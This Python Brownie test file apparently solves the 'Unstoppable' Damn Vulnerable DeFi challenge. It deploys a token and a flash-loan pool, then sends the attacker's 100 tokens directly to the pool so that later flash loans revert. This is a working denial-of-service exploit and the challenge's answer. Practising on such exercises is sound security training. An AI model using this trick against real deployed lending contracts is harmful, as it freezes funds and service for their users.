from brownie import UnstoppableLender, ReceiverUnstoppable, DamnValuableToken, Wei, accounts, reverts


# deploy the contracts / set up
# come up with the exploit
# test your exploit

# Pool has 1M * 10**18 tokens
TOKENS_IN_POOL = Wei("1000000 ether")
INITIAL_ATTACKER_TOKEN_BALANCE = Wei("100 ether")


def setup_contracts():
    deployer = accounts[0]
    attacker = accounts[1]

    #deploying contracts 🚀
    token = DamnValuableToken.deploy({"from": deployer})
    pool = UnstoppableLender.deploy(token, {"from": deployer})

    #configuring the contracts 🧑‍💻
    token.approve(pool, TOKENS_IN_POOL, {"from": deployer})
    pool.depositTokens(TOKENS_IN_POOL, {"from": deployer})

    #transfer 100 tokens to the attacker(🫵)
    token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE, {'from': deployer})

    assert token.balanceOf(pool) == TOKENS_IN_POOL
    assert token.balanceOf(attacker) == INITIAL_ATTACKER_TOKEN_BALANCE

    return deployer, attacker, token, pool
    


def test_attacking_the_contract():
    
    deployer, attacker, token, pool  = setup_contracts()
    quagmire = accounts[3]

    # quagmire taking a flash a loan to show its possible
    receiver_contract = ReceiverUnstoppable.deploy(pool, {"from": quagmire})

    receiver_contract.executeFlashLoan(10, {"from": quagmire})

    # CODE YOUR EXPLOIT HERE 😈
    token.transfer(pool, INITIAL_ATTACKER_TOKEN_BALANCE, {"from": attacker})

    # SUCCESS CONDITIONS 🕺
    # It's no longer possible to execute flash loans
    with reverts():
        receiver_contract.executeFlashLoan(10, {"from": quagmire})
